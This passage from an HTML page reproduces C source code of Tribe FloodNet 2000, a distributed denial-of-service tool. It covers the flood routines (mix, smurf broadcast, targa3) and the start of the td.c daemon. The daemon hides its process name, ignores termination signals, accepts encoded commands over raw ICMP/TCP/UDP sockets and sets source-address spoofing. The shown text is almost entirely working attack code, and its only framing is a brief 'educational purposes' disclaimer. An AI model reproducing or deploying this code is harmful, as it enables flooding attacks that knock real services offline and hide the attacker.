<br><font color="#FF0000">&nbsp;&nbsp; while (1)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; icmp (resolved, 0);</font>
<br><font color="#FF0000">&nbsp;}</font>
<br><font color="#FF0000">#ifdef ATTACKLOG</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;char tmpbuf[100];</font>
<br><font color="#FF0000">&nbsp;sprintf (tmpbuf, "PID %d forking (#%d),
child (%d) attacks %s, ICMP\n"</font>
<br><font color="#FF0000">&nbsp;&nbsp; ,getpid (), i, p, parse);</font>
<br><font color="#FF0000">&nbsp;dbug (tmpbuf);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">#endif</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pid[i] = p;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; parse = strtok
(NULL, DELIMITER);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">}</font>
<p><font color="#FF0000">void</font>
<br><font color="#FF0000">commence_mix (char *ip)</font>
<br><font color="#FF0000">{</font>
<br><font color="#FF0000">&nbsp; int i = -1, p;</font>
<br><font color="#FF0000">&nbsp; unsigned long resolved = 0;</font>
<br><font color="#FF0000">&nbsp; char *parse;</font>
<p><font color="#FF0000">&nbsp; if ((parse = strtok (ip, DELIMITER)) ==
NULL)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fw00ding = 0;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">&nbsp; while ((parse != NULL) &amp;&amp; (i++
&lt; CHLD_MAX))</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; resolved = resolve
(parse);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; p = fork ();</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!p)</font>
<br><font color="#FF0000">&nbsp;{</font>
<br><font color="#FF0000">&nbsp;&nbsp; rawsock = socket (AF_INET, SOCK_RAW,
RAW);</font>
<br><font color="#FF0000">&nbsp;&nbsp; if (rawsock &lt; 0)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; rawsock = socket (AF_INET,
SOCK_RAW, IP);</font>
<br><font color="#FF0000">&nbsp;&nbsp; setsockopt (rawsock, IP, IP_HDRINCL,
"1", sizeof ("1"));</font>
<br><font color="#FF0000">&nbsp;&nbsp; if (resolved == -1)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; exit (0);</font>
<br><font color="#FF0000">&nbsp;&nbsp; while (1)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; icmp (resolved,
0);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; syn (resolved,
0);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; udp (resolved);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">&nbsp;}</font>
<br><font color="#FF0000">#ifdef ATTACKLOG</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;char tmpbuf[100];</font>
<br><font color="#FF0000">&nbsp;sprintf (tmpbuf, "PID %d forking (#%d),
child (%d) attacks %s, MIX\n"</font>
<br><font color="#FF0000">&nbsp;&nbsp; ,getpid (), i, p, parse);</font>
<br><font color="#FF0000">&nbsp;dbug (tmpbuf);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">#endif</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pid[i] = p;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; parse = strtok
(NULL, DELIMITER);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">}</font>
<p><font color="#FF0000">void</font>
<br><font color="#FF0000">commence_smurf (char *ip)</font>
<br><font color="#FF0000">{</font>
<br><font color="#FF0000">&nbsp; int i = -1, p;</font>
<br><font color="#FF0000">&nbsp; unsigned long bcast, resolved = 0;</font>
<br><font color="#FF0000">&nbsp; char *parse;</font>
<p><font color="#FF0000">&nbsp; if ((parse = strtok (ip, DELIMITER)) ==
NULL)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fw00ding = 0;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">&nbsp; resolved = resolve (parse);</font>
<br><font color="#FF0000">&nbsp; if (resolved == -1)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fw00ding = 0;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">&nbsp; if ((parse = strtok (NULL, DELIMITER))
== NULL)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fw00ding = 0;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">&nbsp; while ((parse != NULL) &amp;&amp; (i++
&lt; CHLD_MAX))</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bcast = resolve
(parse);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; p = fork ();</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!p)</font>
<br><font color="#FF0000">&nbsp;{</font>
<br><font color="#FF0000">&nbsp;&nbsp; rawsock = socket (AF_INET, SOCK_RAW,
RAW);</font>
<br><font color="#FF0000">&nbsp;&nbsp; if (rawsock &lt; 0)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; rawsock = socket (AF_INET,
SOCK_RAW, ICMP);</font>
<br><font color="#FF0000">&nbsp;&nbsp; setsockopt (rawsock, IP, IP_HDRINCL,
"1", sizeof ("1"));</font>
<br><font color="#FF0000">&nbsp;&nbsp; if (resolved == -1)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; exit (0);</font>
<br><font color="#FF0000">&nbsp;&nbsp; while (1)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; icmp (resolved, bcast);</font>
<br><font color="#FF0000">&nbsp;}</font>
<br><font color="#FF0000">#ifdef ATTACKLOG</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;char tmpbuf[100];</font>
<br><font color="#FF0000">&nbsp;sprintf (tmpbuf, "PID %d forking (#%d),
child (%d) attack-bcast %s, SMURF\n"</font>
<br><font color="#FF0000">&nbsp;&nbsp; ,getpid (), i, p, parse);</font>
<br><font color="#FF0000">&nbsp;dbug (tmpbuf);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">#endif</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pid[i] = p;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; parse = strtok
(NULL, DELIMITER);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">}</font>
<p><font color="#FF0000">void</font>
<br><font color="#FF0000">commence_targa3 (char *ip)</font>
<br><font color="#FF0000">{</font>
<br><font color="#FF0000">&nbsp; int i = -1, p;</font>
<br><font color="#FF0000">&nbsp; unsigned long resolved = 0;</font>
<br><font color="#FF0000">&nbsp; char *parse;</font>
<p><font color="#FF0000">&nbsp; if ((parse = strtok (ip, DELIMITER)) ==
NULL)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fw00ding = 0;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">&nbsp; while ((parse != NULL) &amp;&amp; (i++
&lt; CHLD_MAX))</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; resolved = resolve
(parse);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; p = fork ();</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!p)</font>
<br><font color="#FF0000">&nbsp;{</font>
<br><font color="#FF0000">&nbsp;&nbsp; rawsock = socket (AF_INET, SOCK_RAW,
RAW);</font>
<br><font color="#FF0000">&nbsp;&nbsp; if (rawsock &lt; 0)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; rawsock = socket (AF_INET,
SOCK_RAW, 0);</font>
<br><font color="#FF0000">&nbsp;&nbsp; setsockopt (rawsock, IP, IP_HDRINCL,
"1", sizeof ("1"));</font>
<br><font color="#FF0000">&nbsp;&nbsp; if (resolved == -1)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; exit (0);</font>
<br><font color="#FF0000">&nbsp;&nbsp; while (1)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; targa3 (resolved);</font>
<br><font color="#FF0000">&nbsp;}</font>
<br><font color="#FF0000">#ifdef ATTACKLOG</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;char tmpbuf[100];</font>
<br><font color="#FF0000">&nbsp;sprintf (tmpbuf, "PID %d forking (#%d),
child (%d) attacks %s, TARGA3\n"</font>
<br><font color="#FF0000">&nbsp;&nbsp; ,getpid (), i, p, parse);</font>
<br><font color="#FF0000">&nbsp;dbug (tmpbuf);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">#endif</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pid[i] = p;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; parse = strtok
(NULL, DELIMITER);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">}</font>
<p><font color="#FF0000">void</font>
<br><font color="#FF0000">must_kill_all (void)</font>
<br><font color="#FF0000">{</font>
<br><font color="#FF0000">&nbsp; int i;</font>
<p><font color="#FF0000">&nbsp; for (i = 0; i &lt;= CHLD_MAX - 1; i++)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">#ifdef ATTACKLOG</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char tmp[100];</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (pid[i] &lt;
2)</font>
<br><font color="#FF0000">&nbsp;break;&nbsp;&nbsp; /* killing -1 or 0 !=
fun :) */</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sprintf (tmp,
"Killing flood pid (#%d): %d\n", i, pid[i]);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dbug (tmp);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; kill (pid[i],
9);</font>
<br><font color="#FF0000">#else</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (pid[i] &lt;
2)</font>
<br><font color="#FF0000">&nbsp;break;&nbsp;&nbsp; /* killing -1 or 0 !=
fun :) */</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; kill (pid[i],
9);</font>
<br><font color="#FF0000">#endif</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">}</font>
<br>
<hr WIDTH="100%">
<center><font color="#3333FF"><font size=+1>td.c</font></font></center>

<p><font color="#3333FF">/*</font>
<br><font color="#3333FF">&nbsp;* Tribe FloodNet - 2k edition</font>
<br><font color="#3333FF">&nbsp;* by Mixter &lt;mixter@newyorkoffice.com></font>
<br><font color="#3333FF">&nbsp;*</font>
<br><font color="#3333FF">&nbsp;* td.c - tribe flood server</font>
<br><font color="#3333FF">&nbsp;*</font>
<br><font color="#3333FF">&nbsp;* This program is distributed for educational
purposes and without any</font>
<br><font color="#3333FF">&nbsp;* explicit or implicit warranty; in no
event shall the author or</font>
<br><font color="#3333FF">&nbsp;* contributors be liable for any direct,
indirect or incidental damages</font>
<br><font color="#3333FF">&nbsp;* arising in any way out of the use of
this software.</font>
<br><font color="#3333FF">&nbsp;*</font>
<br><font color="#3333FF">&nbsp;*/</font>
<p><font color="#3333FF">#include "tribe.h"</font>
<p><font color="#3333FF">extern int fw00ding, nospoof, port4syn, psize;</font>
<br><font color="#3333FF">extern unsigned long myip;</font>
<br><font color="#3333FF">extern void security_through_obscurity (int);</font>
<p><font color="#3333FF">void tribe_cmd (char, char *, char **);</font>
<p><font color="#3333FF">int</font>
<br><font color="#3333FF">main (int argc, char **argv)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp; char buf[BS], clear[BS];</font>
<br><font color="#3333FF">&nbsp; struct ip *iph = (struct ip *) buf;</font>
<br><font color="#3333FF">&nbsp; struct tribe *tribeh = (struct tribe *)
clear;</font>
<br><font color="#3333FF">&nbsp; int isock, tsock, usock, i;</font>
<br><font color="#3333FF">&nbsp; char *p = NULL, *data = (clear + sizeof
(struct tribe));</font>
<br><font color="#3333FF">&nbsp; fd_set rfds;</font>
<p><font color="#3333FF">&nbsp; isock = socket (AF_INET, SOCK_RAW, ICMP);</font>
<br><font color="#3333FF">&nbsp; tsock = socket (AF_INET, SOCK_RAW, TCP);</font>
<br><font color="#3333FF">&nbsp; usock = socket (AF_INET, SOCK_RAW, UDP);</font>
<p><font color="#3333FF">&nbsp; if (geteuid ())</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; exit (-1);</font>
<p><font color="#3333FF">&nbsp; memset (argv[0], 0, strlen (argv[0]));</font>
<br><font color="#3333FF">&nbsp; strcpy (argv[0], HIDEME);</font>
<br><font color="#3333FF">&nbsp; close (0);</font>
<br><font color="#3333FF">&nbsp; close (1);</font>
<br><font color="#3333FF">&nbsp; close (2);</font>
<br><font color="#3333FF">#ifndef WINDOZE</font>
<br><font color="#3333FF">&nbsp; if (fork ())</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; exit (0);</font>
<br><font color="#3333FF">#else</font>
<br><font color="#3333FF">&nbsp; switch (fork ())</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; case -1:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; perror ("fork");</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit (0);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; case 0:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; default:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#3333FF">#endif</font>
<p><font color="#3333FF">&nbsp; signal (SIGHUP, SIG_IGN);</font>
<br><font color="#3333FF">&nbsp; signal (SIGTERM, SIG_IGN);</font>
<br><font color="#3333FF">&nbsp; signal (SIGCHLD, SIG_IGN);</font>
<p><font color="#3333FF">&nbsp; while (1)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FD_ZERO (&amp;rfds);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FD_SET (isock,
&amp;rfds);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FD_SET (usock,
&amp;rfds);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FD_SET (tsock,
&amp;rfds);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (select (usock
+ 1, &amp;rfds, NULL, NULL, NULL) &lt; 1)</font>
<br><font color="#3333FF">&nbsp;continue;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (FD_ISSET (isock,
&amp;rfds))</font>
<br><font color="#3333FF">&nbsp;{</font>
<br><font color="#3333FF">&nbsp;&nbsp; i = read (isock, buf, BS) - (sizeof
(struct ip) + sizeof (struct icmp));</font>
<br><font color="#3333FF">&nbsp;&nbsp; myip = htonl (iph->dst);</font>
<br><font color="#3333FF">&nbsp;&nbsp; if (i &lt; 4)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; continue;</font>
<br><font color="#3333FF">&nbsp;&nbsp; p = (buf + sizeof (struct ip) +
sizeof (struct icmp));</font>
<br><font color="#3333FF">&nbsp;&nbsp; if (!isprint (p[0]))</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; continue;</font>
<br><font color="#3333FF">&nbsp;&nbsp; memset (clear, 0, BS);</font>
<br><font color="#3333FF">&nbsp;&nbsp; security_through_obscurity (1);</font>
<br><font color="#3333FF">&nbsp;&nbsp; decode64 (p, clear, i);</font>
<br><font color="#3333FF">&nbsp;&nbsp; memset (buf, 0, BS);</font>
<br><font color="#3333FF">&nbsp;&nbsp; security_through_obscurity (0);</font>
<br><font color="#3333FF">&nbsp;&nbsp; if ((tribeh->start == PROTO_SEP)
&amp;&amp; (tribeh->end == PROTO_SEP))</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; tribe_cmd (tribeh->id,
data, argv);</font>
<br><font color="#3333FF">&nbsp;}</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (FD_ISSET (tsock,
&amp;rfds))</font>
<br><font color="#3333FF">&nbsp;{</font>
<br><font color="#3333FF">&nbsp;&nbsp; i = read (tsock, buf, BS) - (sizeof
(struct ip) + sizeof (struct tcp));</font>
<br><font color="#3333FF">&nbsp;&nbsp; myip = htonl (iph->dst);</font>
<br><font color="#3333FF">&nbsp;&nbsp; if (i &lt; 4)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; continue;</font>
<br><font color="#3333FF">&nbsp;&nbsp; p = (buf + sizeof (struct ip) +
sizeof (struct tcp));</font>
<br><font color="#3333FF">&nbsp;&nbsp; if (!isprint (p[0]))</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; continue;</font>
<br><font color="#3333FF">&nbsp;&nbsp; memset (clear, 0, BS);</font>
<br><font color="#3333FF">&nbsp;&nbsp; security_through_obscurity (1);</font>
<br><font color="#3333FF">&nbsp;&nbsp; decode64 (p, clear, i);</font>
<br><font color="#3333FF">&nbsp;&nbsp; memset (buf, 0, BS);</font>
<br><font color="#3333FF">&nbsp;&nbsp; security_through_obscurity (0);</font>
<br><font color="#3333FF">&nbsp;&nbsp; if ((tribeh->start == PROTO_SEP)
&amp;&amp; (tribeh->end == PROTO_SEP))</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; tribe_cmd (tribeh->id,
data, argv);</font>
<br><font color="#3333FF">&nbsp;}</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (FD_ISSET (usock,
&amp;rfds))</font>
<br><font color="#3333FF">&nbsp;{</font>
<br><font color="#3333FF">&nbsp;&nbsp; i = read (usock, buf, BS) - (sizeof
(struct ip) + sizeof (struct udp));</font>
<br><font color="#3333FF">&nbsp;&nbsp; myip = htonl (iph->dst);</font>
<br><font color="#3333FF">&nbsp;&nbsp; if (i &lt; 4)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; continue;</font>
<br><font color="#3333FF">&nbsp;&nbsp; p = (buf + sizeof (struct ip) +
sizeof (struct udp));</font>
<br><font color="#3333FF">&nbsp;&nbsp; if (!isprint (p[0]))</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; continue;</font>
<br><font color="#3333FF">&nbsp;&nbsp; memset (clear, 0, BS);</font>
<br><font color="#3333FF">&nbsp;&nbsp; security_through_obscurity (1);</font>
<br><font color="#3333FF">&nbsp;&nbsp; decode64 (p, clear, i);</font>
<br><font color="#3333FF">&nbsp;&nbsp; memset (buf, 0, BS);</font>
<br><font color="#3333FF">&nbsp;&nbsp; security_through_obscurity (0);</font>
<br><font color="#3333FF">&nbsp;&nbsp; if ((tribeh->start == PROTO_SEP)
&amp;&amp; (tribeh->end == PROTO_SEP))</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; tribe_cmd (tribeh->id,
data, argv);</font>
<br><font color="#3333FF">&nbsp;}</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#3333FF">/* 1 != 1 */</font>
<br><font color="#3333FF">&nbsp; return (0);</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">void</font>
<br><font color="#3333FF">tribe_cmd (char id, char *target, char **argp)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">#ifdef ATTACKLOG</font>
<br><font color="#3333FF">&nbsp; {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; char tmp[BS];</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; sprintf (tmp, "PID %d CMD
'%c' TARGET %s\n"</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ,getpid (), id,
target);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; dbug (tmp);</font>
<br><font color="#3333FF">&nbsp; }</font>
<br><font color="#3333FF">#endif</font>
<p><font color="#3333FF">&nbsp; switch (id)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; case ID_ICMP:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (fw00ding)&nbsp;
/* already in progress, ignored */</font>
<br><font color="#3333FF">&nbsp;break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fw00ding = 3;&nbsp;
/* commencing ICMP/8 flood */</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strcpy (argp[0],
HIDEKIDS);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; commence_icmp
(target);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strcpy (argp[0],
HIDEME);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; case ID_SMURF:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (fw00ding)&nbsp;
/* already in progress, ignored */</font>
<br><font color="#3333FF">&nbsp;break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fw00ding = 4;&nbsp;
/* commencing SMURF broadcast flood */</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strcpy (argp[0],
HIDEKIDS);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; commence_smurf
(target);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strcpy (argp[0],
HIDEME);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; case ID_SENDUDP:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (fw00ding)&nbsp;
/* already in progress, ignored */</font>
<br><font color="#3333FF">&nbsp;break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fw00ding = 1;&nbsp;
/* commencing UDP flood */</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strcpy (argp[0],
HIDEKIDS);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; commence_udp (target);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strcpy (argp[0],
HIDEME);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; case ID_SENDSYN:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (fw00ding)&nbsp;
/* already in progress, ignored */</font>
<br><font color="#3333FF">&nbsp;break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fw00ding = 2;&nbsp;
/* commencing SYN flood */</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strcpy (argp[0],
HIDEKIDS);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; commence_syn (target,
port4syn);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strcpy (argp[0],
HIDEME);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; case ID_STOPIT:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!fw00ding)&nbsp;
/* this has no longer a meaning */</font>
<br><font color="#3333FF">&nbsp;break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; must_kill_all
();&nbsp; /* all flood childs terminating */</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; usleep (100);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fw00ding = 0;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; case ID_SYNPORT:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; port4syn = atoi
(target); /* syn port set */</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; case ID_PSIZE:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; psize = atoi (target);
/* new packet size */</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; case ID_SWITCH:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; switch (atoi (target))</font>
<br><font color="#3333FF">&nbsp;{</font>
<br><font color="#3333FF">&nbsp;case 0:</font>
<br><font color="#3333FF">&nbsp;&nbsp; nospoof = 0;&nbsp; /* spoof mask:
*.*.*.* */</font>
<br><font color="#3333FF">&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;case 1:</font>
<br><font color="#3333FF">&nbsp;&nbsp; nospoof = 1;&nbsp; /* spoof mask:
real.*.*.* */</font>
<br><font color="#3333FF">&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;case 2:</font>
<br><font color="#3333FF">&nbsp;&nbsp; nospoof = 2;&nbsp; /* spoof mask:
real.real.*.* */</font>
<br><font color="#3333FF">&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;case 3:</font>
